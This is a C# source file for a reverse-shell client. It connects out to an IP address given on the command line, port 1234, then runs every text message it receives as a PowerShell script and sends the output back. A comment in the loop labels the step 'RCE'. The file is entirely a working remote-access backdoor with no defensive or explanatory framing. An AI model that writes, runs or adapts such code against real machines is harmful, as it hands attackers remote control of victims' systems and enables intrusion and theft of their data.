using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;
using System.IO;

namespace ClientSocket
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int buff_size = 2048;
            Program p = new Program();
                
            // Setting up the socket and connecting to the server
            IPAddress server_ip = IPAddress.Parse(args[0]);
            IPEndPoint iP = new IPEndPoint(server_ip, 1234);
            Socket cs = new Socket(server_ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            cs.Connect(iP);
            
            //-----------------------------------------------------------------------------------------------
            //creating runspace for powershell and executing commands
            string result = "";

            RunspaceConfiguration rc = RunspaceConfiguration.Create();
            Runspace r = RunspaceFactory.CreateRunspace(rc);
            r.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = r;
            //-----------------------------------------------------------------------------------------------

            //Sending and receiving stuff (initialization):
            byte[] b = new byte[buff_size];
            string msg;
            Array.Clear(b, 0, b.Length);
            cs.Receive(b);
            msg = Encoding.ASCII.GetString(b).TrimEnd('\0');
            Console.WriteLine(msg);

            // Loop for receiving commands and sending results
            while (msg != "quit")  {
                // RCE -------------------------------------------------------
                ps.AddScript(msg);
                StringWriter sw = new StringWriter();
                Collection<PSObject> po = ps.Invoke();
                foreach (PSObject i in po)
                {
                    sw.WriteLine(i.ToString());
                }
                result = sw.ToString();
                if (result == "")
                {
                    result = "...";
                }
                // -----------------------------------------------------------
                cs.Send(Encoding.ASCII.GetBytes(result));

                Array.Clear(b, 0, b.Length);
                cs.Receive(b);
                msg = Encoding.ASCII.GetString(b).TrimEnd('\0');
                Console.WriteLine(msg);
            }
            // Finishing up:
            cs.Close();
        }
    }
}
